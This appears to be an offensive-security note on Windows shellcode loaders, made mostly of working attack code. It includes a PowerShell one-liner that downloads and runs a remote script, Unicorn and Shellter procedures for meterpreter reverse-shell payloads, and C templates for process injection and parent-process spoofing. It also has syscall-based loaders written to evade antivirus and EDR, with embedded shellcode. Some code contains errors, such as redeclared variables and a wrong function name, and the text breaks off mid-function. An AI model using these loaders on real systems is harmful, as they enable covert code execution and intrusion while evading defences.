# Windows - Shellcode and PE loader

### Compilation

The basic `C` / `C++` code snippets in this note can be compiled on Linux using
the cross-compiler `mingw` or on Windows (recommended) using
`Developer Command Prompt` from `Visual Studio`:

```
# mingw.
# 32 bits
i686-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
i686-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
# 64 bits
x86_64-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
x86_64-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>

# Visual Studio build tools.
cl <C_PROGRAM | CPP_PROGRAM>
```

Compiling on Windows is recommended for anti-virus evasion, as some products
may categorize `mingw` compilation artefacts.

### Basic shellcode loaders

###### [Windows] PowerShell Invoke-Shellcode

The `PowerShell` `PowerSploit`'s `Invoke-Shellcode` cmdlet can be leveraged to
execute directly in memory the shellcode through `IEX` `DownloadString`.

Depending on the system architecture, `Invoke-Shellcode` will either inject and
run the shellcode specified in the `$Shellcode32` or `$Shellcode64` variables.

```bash
# A web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload type must be up and running

powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
```

*As a compiled binary.*

The following `C` code can be used to compile a binary that will execute the
`PowerShell`'s `Invoke-Shellcode` cmdlet:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;");
	return 0;
}
```

###### [Windows] PowerShell - Unicorn

[`Magic Unicorn`](https://github.com/trustedsec/unicorn) is a tool for using a
PowerShell downgrade attack and inject shellcode (custom, `Cobalt Strike`
`beacon` or `Metasploit` `meterpreter`) straight into memory.

*Ensure Metasploit is installed if using Metasploit methods.*
If using `meterpreter` payloads the script will generate two files :
 - `PowerShell_attack.txt`
 - `unicorn.rc`

The text file contains all of the code needed in order to inject the
PowerShell attack into memory and the `rc` file can be used to start a
`Metasploit` reverse handler.

The commands are as follow:

```bash
python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>

# On host.
msfconsole -r unicorn.rc

# On target.
# Execute the PowerShell command contained in the powershell_attack.txt file
```

###### [Windows] Basic C loader - CreateThread (intra-process)

*The shellcode loaders below (especially the remote one) are likely to be flag
by all `Endpoint detection and response` and behavioural anti-virus products.*

The `C` code below may be used as a template for running a shellcode in the
current process:

```c
#include "stdio.h"
#include "Windows.h"

int _tmain(int argc, TCHAR** argv) {
    // Hex encoded binary shellcode.
    // PoC example: msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c
    unsigned char shellcode[] = "";

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).
    LPVOID shellcodeBaseAddress = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);

    if (!shellcodeBaseAddress) {
        printf("Allocation of memory using VirtualAlloc failed: %x\n", GetLastError());
        return 1;
    }

    // Copy the shellcode in the newly allocated memory section.
    memcpy(shellcodeBaseAddress, shellcode, sizeof(shellcode));

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD OldProtectt = 0;
    BOOL virtualProctectStatus = VirtualProtect(shellcodeBaseAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtectt);

    if (!virtualProctectStatus) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtect failed: %x\n", GetLastError());
        return 1;
    }

    // Execute the shellcode by creating a new thread in the current process.
    SECURITY_ATTRIBUTES lpThreadAttributes = { 0 };
    HANDLE hThread = CreateThread(&lpThreadAttributes, 0, (LPTHREAD_START_ROUTINE) shellcodeBaseAddress, NULL, 0, NULL);

    if (!hThread) {
        printf("Thread execution using CreateThread failed: %x\n", GetLastError());
        return 1;
    }

    // Wait for the shellcode thread to finish execution.
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle after use.
    CloseHandle(hThread);

    return 0;
}
```

###### [Windows] Basic C loader - CreateRemoteThread (inter-process)

The `C` code below may be used as a template for running a shellcode in a
remote process:

```c

#include "windows.h"
#include "Processthreadsapi.h"
#include "stdio.h"
#include "tchar.h"
#include "tlhelp32.h"

/*
*
* if using GetProcAddress to avoid suspicious imports in IAT.
*
*/

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE             ProcessHandle,
    PVOID*             BaseAddress,
    ULONG              ZeroBits,
    PULONG             RegionSize,
    ULONG              AllocationType,
    ULONG              Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE             ProcessHandle,
    PVOID              BaseAddress,
    PVOID              Buffer,
    ULONG              NumberOfBytesToWrite,
    PULONG             NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE             ProcessHandle,
    PVOID*             BaseAddress,
    PSIZE_T            RegionSize,
    ULONG              NewProtect,
    PULONG             OldProtect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE            ThreadHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE             ProcessHandle,
    PVOID              StartRoutine,
    PVOID              Argument,
    ULONG              CreateFlags,
    SIZE_T             ZeroBits,
    SIZE_T             StackSize,
    SIZE_T             MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

DWORD GetProcessId(const TCHAR* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    #ifdef _DEBUG
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        printf("Unable to acquire processes snapshot");
        return 0;
    }
    #endif

    Process32First(processesSnapshot, &processInfo);

    if (!_tcscmp(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!_tcscmp(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);

    return 0;
}

int _tmain(int argc, TCHAR** argv) {

    // Hex encoded binary shellcode.
    unsigned char shellcode[] = "";
    size_t szShellcode = sizeof(shellcode);

    #ifdef _DEBUG
    if (argc < 2) {
        printf("Usage: code.exe <TARGET_PROCESS_PID | TARGET_PROCESS_NAME>\n");
        return 1;
    }
    #endif

    DWORD tpid = _tstoi(argv[1]);

    if (tpid == 0) {
        tpid = GetProcessId(argv[1]);
    }

    #ifdef _DEBUG
    if (tpid == 0) {
        printf("Invalid PID or process name specified\n");
        return 1;
    }
    #endif

    // Obtain an handle to the remote process.
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);

    #ifdef _DEBUG
    if (!hProc) {
        printf("Getting an handle on remote process using OpenProcess failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).

    size_t szAllocated = szShellcode;

    /* Standard API. */
    LPVOID shellcodeBaseAddress = VirtualAllocEx(hProc, 0, szAllocated, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    /* ntdll direct call (to avoid an import in the IAT). */
    pNtAllocateVirtualMemory NtAllocateVirtualMemoryFunc = (pNtAllocateVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    NtAllocateVirtualMemoryFunc(hProc, &shellcodeBaseAddress, 0, (PULONG)&szAllocated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy the shellcode in the newly allocated memory section.

    /* Standard API. */
    BOOL WriteProcessMemoryStatus = WriteProcessMemory(hProc, shellcodeBaseAddress, shellcode, sizeof(shellcode), NULL);
    #ifdef _DEBUG
    if (!WriteProcessMemoryStatus) {
        printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    /* ntdll direct call (to avoid an import in the IAT). */
    pNtWriteVirtualMemory NtWriteVirtualMemoryFunc = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    NTSTATUS  WriteProcessMemoryStatus = NtWriteVirtualMemoryFunc(hProc, shellcodeBaseAddress, shellcode, szShellcode, NULL);
    #ifdef _DEBUG
    if (WriteProcessMemoryStatus != 0) {
        printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD OldProtectt = 0;

    /* Standard API. */
    BOOL virtualProctectExStatus = VirtualProtectEx(hProc, shellcodeBaseAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtectt);
    #ifdef _DEBUG
    if (!virtualProctectExStatus) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    /* ntdll direct call (to avoid an import in the IAT). */
    pNtProtectVirtualMemory NtProtectVirtualMemoryFunc = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    NTSTATUS virtualProctectExStatus = NtProtectVirtualMemoryFunc(hProc, &shellcodeBaseAddress, &szAllocated, PAGE_EXECUTE_READ, &OldProtectt);
    #ifdef _DEBUG
    if (virtualProctectExStatus != 0) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    // Execute the shellcode by creating a new thread in the current process.
    SECURITY_ATTRIBUTES lpThreadAttributes = { 0 };
    HANDLE hThread = NULL;

    /* Standard API. */
    hThread = CreateRemoteThread(hProc, &lpThreadAttributes, 0, (LPTHREAD_START_ROUTINE)shellcodeBaseAddress, NULL, 0, NULL);

    /* ntdll direct call (to avoid an import in the IAT). */
    pNtCreateThreadEx NtCreateThreadExFunc = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateThreadEx");
    hThread = NtCreateThreadExFunc(&hThread, GENERIC_EXECUTE, NULL, hProc, shellcodeBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    #ifdef _DEBUG
    if (!hThread) {
        printf("Thread execution using CreateRemoteThread failed: %x\n", GetLastError());
        return 1;
    }
    #endif

    CloseHandle(hThread);
    CloseHandle(hProc);

    return 0;
}
```

###### [Windows] Basic C loader - Create process with parent spoofing

The following `C` code can be used to spawn a process as the child of another
specified process (allowing for cross sessions or user security context
usurpation):

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

int main(int argc, char** argv) {

    HANDLE hProc = NULL;
    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;
    int pid = 0;
    SIZE_T szAttributeList = 0;
    BOOL ret;

    ZeroMemory(&si, sizeof(STARTUPINFOEX));

    Sleep(2000);

    if (argc != 2) {
        printf("Usage: SpawnChildProcess.exe <PID>\n");
        return -1;
    }

    DWORD tPid = atoi(argv[1]);

    hProc = OpenProcess(PROCESS_ALL_ACCESS, false, tPid);
    if (!hProc) {
#ifdef _DEBUG
        printf("[!][OpenProcess] Error opening target process: [%d]\n", GetLastError());
#endif
        return -1;
    }
#ifdef _DEBUG
    else {

        printf("[*][OpenProcess] Handle to target process opened.\n");
    }
#endif

    // First call to InitializeProcThreadAttributeList to retrieve the AttributeList size.
    InitializeProcThreadAttributeList(NULL, 1, 0, &szAttributeList);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
#ifdef _DEBUG
        printf("[!][InitializeProcThreadAttributeList] First call to InitializeProcThreadAttributeList failed: [%d]\n", GetLastError());
#endif
        CloseHandle(hProc);
        return -1;
    }
#ifdef _DEBUG
    else {
        printf("[*][InitializeProcThreadAttributeList] Attribute list size retrieved.\n");
    }
#endif

    // Alloc lpAttributeList.
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, szAttributeList);
    if (si.lpAttributeList == NULL) {
#ifdef _DEBUG
        printf("[!][HeapAlloc] Failed to heap alloc for si.lpAttributeList: [%d]\n", GetLastError());
#endif
        CloseHandle(hProc);
        return -1;
    }

    // Init ProcThread AttributeList with the correctly sized szAttributeList.
    ret = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &szAttributeList);
    if (!ret) {
#ifdef _DEBUG
        printf("[!][InitializeProcThreadAttributeList] Second call to InitializeProcThreadAttributeList failed: [%d]\n", GetLastError());
#endif
        CloseHandle(hProc);
        return -1;
    }
#ifdef _DEBUG
    else {
        printf("[*][InitializeProcThreadAttributeList] Attribute list init done.\n");
    }
#endif

    // Updates the specified attribute for process.
    ret = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);
    if (!ret) {
#ifdef _DEBUG
        printf("[!][UpdateProcThreadAttribute] Failed to update the ProcThread attribute: [%d]\n", GetLastError());
#endif
        CloseHandle(hProc);
        return -1;
    }
#ifdef _DEBUG
    else {
        printf("[*][UpdateProcThreadAttribute] Attribute list for process creation updated.\n");
    }
#endif

    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    // Spawn the new process
    ret = CreateProcess(_T("C:\\Windows\\system32\\cmd.exe"), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFO)(&si), &pi);
    if (!ret) {
#ifdef _DEBUG
        printf("[!][CreateProcess] Failed to create process: [%d]\n", GetLastError());
#endif
        CloseHandle(hProc);
        return -1;
    }
#ifdef _DEBUG
    else {
        printf("[+][CreateProcess] Process created!\n");
    }
#endif

    Sleep(2000);

    return 0;
}
```

### Shellcode loader for static analysis evasion

###### [Windows] Shellter

`Shellter` is a dynamic shellcode injection tool that can be used in order to
inject shellcode into native Windows applications (currently 32-bit
applications only for the free version). The shellcode can be self made or
generated within `Shellter` through a framework, such as Metasploit.

The following built-in shellcodes are currently supported:

```
Meterpreter_Reverse_TCP
Meterpreter_Reverse_HTTP
Meterpreter_Reverse_HTTPS
Meterpreter_Bind_TCP
Shell_Reverse_TCP
Shell_Bind_TCP
WinExec
```

The procedure to create a binary is as follow:

```
$ shellter.exe

Choose Operation Mode - Auto/Manual (A/M/H): A
Perform Online Version Check? (Y/N/H): N

PE Target: <BINARY_TO_INJECT_INTO>

[...]

# Check if the chosen binary match the OS version attacked
Minimum Supported Windows OS: 4.0

# Stealth Mode preserves the original functionality of the infected PE file, so "Stealth" refers to the human factor.
# If you just need a backdoor don't enable this feature.
Enable Stealth Mode? (Y/N/H): N

************
* Payloads *
************
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec
# L: One of the above payload
# C: Custom shellcode, a file path must be provided
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1

# Example for a Meterpreter payload.
***************************
* meterpreter_reverse_tcp *
***************************
SET LHOST: <HOSTNAME | IP>
SET LPORT: <HOSTPORT>
Payload: meterpreter_reverse_tcp

[...]

Injection: Verified!
Press [Enter] to continue...
```

### Shellcode loader for behavioural analysis evasion

###### Direct syscalls with SysWhispers

[`SysWhispers`](https://github.com/jthuraisamy/SysWhispers) is tool that can be
used to generate an `header` and `ASM` file to make directly `syscalls` in
supporting programming languages. `SysWhispers` supports `Windows XP` to
`Windows 10 21H1 (build 19043)` (as of the present note redaction date) using
`syscalls` numbers and prototypes
[referenced in the project repository](https://github.com/jthuraisamy/SysWhispers/blob/master/data).

The `syscall` version to use is determined at runtime directly in the assembly
implemented the `syscall` by retrieving the `OSMajorVersion` and
`OSMinorVersion` fields of the `Process Environment Block (PEB)` (through the
`Thread Information Block (TIB)`).

```bash
# Export the NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx syscalls for all supported Windows versions.
syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx -o syscall_remote_inject

# Export all syscalls with compatibility for all supported Windows versions.
syswhispers.py --preset all -o syscalls_all
```

To add the produced to a `Visual Studio (2019)` project:

  - In the `Solution Explorer` -> Header File -> Add -> New Item... -> Header
	  File (.h) -> Add -> Copy the content the header file produced
	  by `SysWhispers`.

  - In the `Solution Explorer` -> Source File -> Add -> New Item... -> Utility
	  -> Text File (.txt) -> Rename the file extension in .asm -> Copy the
	  content the `ASM` file produced by `SysWhispers`.

  - In the `Solution Explorer`, right click on the project -> Build
	  Dependencies -> Build Customizations... -> Enable "masm(.targets, .props)".

  - Right click on the added `ASM` file -> Properties -> Item Type: Microsoft
	  Macro Assembler.

*CreateRemoteThread execution (inter-process)*

The following `C` code below can then be used to inject and run a shellcode in
a remote process directly using `syscalls`:

```c
#include "windows.h"
#include "Processthreadsapi.h"
#include "stdio.h"
#include "tchar.h"
#include "tlhelp32.h"

// Header file generated by SysWhispers that includes definition for NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx.
#include "SysWhispers.h"

// Returns the PID of the first process matching "processName".
DWORD GetProcessId(const TCHAR* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        printf("Unable to acquire processes snapshot");
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);

    if (!_tcscmp(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!_tcscmp(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);

    return 0;
}

int _tmain(int argc, TCHAR** argv) {

    // Hex encoded binary shellcode.
    unsigned char shellcode[] = "";
    size_t szShellcode = sizeof(shellcode);

    if (argc < 2) {
        printf("Usage: code.exe <TARGET_PROCESS_PID | TARGET_PROCESS_NAME>\n");
        return 1;
    }

    DWORD tpid = _tstoi(argv[1]);

    if (tpid == 0) {
        tpid = GetProcessId(argv[1]);
    }

    if (tpid == 0) {
        printf("Invalid PID or process name specified\n");
        return 1;
    }

    // Obtain an handle to the remote process.
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);

    if (!hProc) {
        printf("Getting an handle on remote process using OpenProcess failed: %x\n", GetLastError());
        return 1;
    }

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).
    LPVOID shellcodeBaseAddress = NULL;
    size_t szAllocated = szShellcode;
    NtAllocateVirtualMemory(hProc, &shellcodeBaseAddress, 0, (PSIZE_T) &szAllocated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy the shellcode in the newly allocated memory section.
    NtWriteVirtualMemory(hProc, shellcodeBaseAddress, shellcode, szShellcode, 0);

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD oldprotect = 0;
    NtProtectVirtualMemory(hProc, &shellcodeBaseAddress, (PSIZE_T) &szAllocated, PAGE_EXECUTE_READ, &oldprotect);

    // Execute the shellcode by creating a new thread in the current process.
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, shellcodeBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    CloseHandle(hProc);

    return 0;
}
```

*Thread hijacking (inter-process)*

The following code snippet can be used to execute the specified shellcode
by  hijacking a thread in the remote process.

Following the writing of the shellcode in the target process memory:

	1. A thread of the target process is first suspended (`NtOpenThread` +
		 `NtSuspendThread`).

	2. The context of the thread is then retrieved (`NtGetContextThread`) and
	   modified (`NtSetContextThread`) to point execute the shellcode (by setting
		 the thread's `instruction pointer register (rip)` to the allocated
		 shellcode).

  3. Finally, the thread execution is resumed (`NtResumeThread`).

```bash
python .\syswhispers.py -a x64 -o ThreadHijacking --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtOpenProcess,NtOpenThread,NtSuspendThread,NtGetContextThread,NtSetContextThread,NtResumeThread
```

```c
int _tmain(int argc, TCHAR** argv) {
    // Hex encoded binary shellcode.

    /* Calc.exe */
    unsigned char shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";

    /* cmd.exe */
    //unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    //    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    //    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    //    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    //    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    //    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    //    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    //    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    //    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    //    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    //    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    //    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    //    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    //    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    //    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    //    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    //    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    //    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
    //    "\x2e\x65\x78\x65\x00";

    size_t szShellcode = sizeof(shellcode);

    if (argc < 2) {
#ifdef _DEBUG
        printf("Usage: code.exe <TARGET_PROCESS_PID | TARGET_PROCESS_NAME>\n");
#endif
        return 1;
    }

    DWORD tpid = _tstoi(argv[1]);

    if (tpid == 0) {
        tpid = GetProcessId(argv[1]);
    }

    if (tpid == 0) {
#ifdef _DEBUG
        printf("Invalid PID or process name specified\n");
#endif
        return 1;
    }

    // Obtain an handle to the remote process.
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);

    if (!hProc) {
#ifdef _DEBUG
        printf("Getting an handle on remote process using OpenProcess failed: %x\n", GetLastError());
#endif
        return 1;
    }

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).

    size_t szAllocated = szShellcode;

    /* Standard API. */
    // LPVOID shellcodeBaseAddress = VirtualAllocEx(hProc, 0, szAllocated, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    /* ntdll direct call (to avoid an import in the IAT). */
    // pNtAllocateVirtualMemory NtAllocateVirtualMemoryFunc = (pNtAllocateVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    // NtAllocateVirtualMemoryFunc(hProc, &shellcodeBaseAddress, 0, (PULONG)&szAllocated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    /* Direct syscall with Syswhisper2 to avoid userland hooks. */
    LPVOID shellcodeBaseAddress = NULL;
    NTSTATUS AllocateVirtualMemoryStatus = NtAllocateVirtualMemory(hProc, &shellcodeBaseAddress, 0, (PSIZE_T)&szAllocated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!shellcodeBaseAddress) {
#ifdef _DEBUG
        printf("Allocation of memory using VirtualAllocEx failed: %x\n", AllocateVirtualMemoryStatus);
#endif
        return 1;
    }

    // Copy the shellcode in the newly allocated memory section.

    /* Standard API. */
//     BOOL WriteProcessMemoryStatus = WriteProcessMemory(hProc, shellcodeBaseAddress, shellcode, sizeof(shellcode), NULL);
//     if (!WriteProcessMemoryStatus) {
//#ifdef _DEBUG
//         printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", GetLastError());
//#endif
//        return 1;
//     }

    /* ntdll direct call (to avoid an import in the IAT). */
    // pNtWriteVirtualMemory NtWriteVirtualMemoryFunc = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    // NTSTATUS  WriteProcessMemoryStatus = NtWriteVirtualMemoryFunc(hProc, shellcodeBaseAddress, shellcode, szShellcode, NULL);

    /* Direct syscall with Syswhisper2 to avoid userland hooks. */
    NTSTATUS WriteProcessMemoryStatus = NtWriteVirtualMemory(hProc, shellcodeBaseAddress, shellcode, szShellcode, NULL);
    if (WriteProcessMemoryStatus != 0) {
#ifdef _DEBUG
        printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", WriteProcessMemoryStatus);
#endif
        return 1;
    }

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD OldProtectt = 0;

    /* Standard API. */
//    BOOL virtualProctectExStatus = VirtualProtectEx(hProc, shellcodeBaseAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtectt);
//    if (!virtualProctectExStatus) {
//#ifdef _DEBUG
//        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", GetLastError());
//#endif
//        return 1;
//    }

    /* ntdll direct call (to avoid an import in the IAT). */
    //pNtProtectVirtualMemory NtProtectVirtualMemoryFunc = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    //NTSTATUS virtualProctectExStatus = NtProtectVirtualMemoryFunc(hProc, &shellcodeBaseAddress, &szAllocated, PAGE_EXECUTE_READ, &OldProtectt);

    /* Direct syscall with Syswhisper2 to avoid userland hooks. */
    NTSTATUS virtualProctectExStatus = NtProtectVirtualMemory(hProc, &shellcodeBaseAddress, &szAllocated, PAGE_EXECUTE_READWRITE, &OldProtectt);

    if (virtualProctectExStatus != 0) {
#ifdef _DEBUG
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", NtProtectVirtualMemory);
#endif
        return 1;
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    HANDLE threadHandle = NULL;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == tpid) {
                OBJECT_ATTRIBUTES ObjectAttributes;
                CLIENT_ID ClientId;
                InitializeObjectAttributes(&ObjectAttributes, NULL, NULL, NULL, NULL);
